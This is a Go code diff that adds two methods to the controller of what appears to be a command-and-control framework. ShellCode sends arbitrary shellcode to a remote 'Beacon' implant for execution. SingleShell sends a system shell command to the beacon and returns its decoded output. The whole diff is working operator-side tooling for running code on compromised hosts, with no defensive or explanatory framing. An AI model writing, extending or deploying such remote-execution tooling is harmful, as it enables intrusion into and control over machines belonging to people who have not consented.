@@ -1,11 +1,13 @@
 package controller
 
 import (
+	"bytes"
 	"context"
 	"io/ioutil"
 	"sync"
 	"time"
 
+	"github.com/axgle/mahonia"
 	"github.com/pkg/errors"
 
 	"project/internal/bootstrap"
@@ -423,4 +425,66 @@ func (ctrl *Ctrl) DeleteBeaconUnscoped(guid *guid.GUID) error {
 	}
 	ctrl.sender.DeleteBeacon(guid)
 	return nil
+}
+
+// ShellCode is used to send a shellcode to Beacon and return the execute result.
+func (ctrl *Ctrl) ShellCode(
+	ctx context.Context,
+	guid *guid.GUID,
+	method string,
+	data []byte,
+	timeout time.Duration,
+) error {
+	shellcode := messages.ShellCode{
+		Method:    method,
+		ShellCode: data,
+	}
+	if timeout < 1 {
+		timeout = 10 * time.Second
+	}
+	reply, err := ctrl.messageMgr.SendToBeacon(ctx, guid,
+		messages.CMDBShellCode, &shellcode, true, timeout)
+	if err != nil {
+		return err
+	}
+	result := reply.(*messages.ShellCodeResult)
+	if result.Err != "" {
+		return errors.New(result.Err)
+	}
+	return nil
+}
+
+// SingleShell is used to send command to Beacon, Beacon will use system shell to
+// execute command and return the execute result, Controller select a decoder to
+// decode the result, usually GBK in Windows, UTF-8 to other platform.
+// <warning> this command can't block, otherwise it will return get reply timeout.
+func (ctrl *Ctrl) SingleShell(
+	ctx context.Context,
+	guid *guid.GUID,
+	cmd string,
+	decoder string,
+	timeout time.Duration,
+) ([]byte, error) {
+	d := mahonia.NewDecoder(decoder)
+	if d == nil {
+		return nil, errors.New("invalid decoder: " + decoder)
+	}
+	shell := messages.SingleShell{
+		Command: cmd,
+	}
+	if timeout < 1 {
+		timeout = 15 * time.Second
+	}
+	reply, err := ctrl.messageMgr.SendToBeacon(ctx, guid,
+		messages.CMDBSingleShell, &shell, true, timeout)
+	if err != nil {
+		return nil, err
+	}
+	output := reply.(*messages.SingleShellOutput)
+	buf := bytes.Buffer{}
+	buf.Write(output.Output)
+	if output.Err != "" {
+		buf.WriteString(output.Err)
+	}
+	return buf.Bytes(), nil
 }
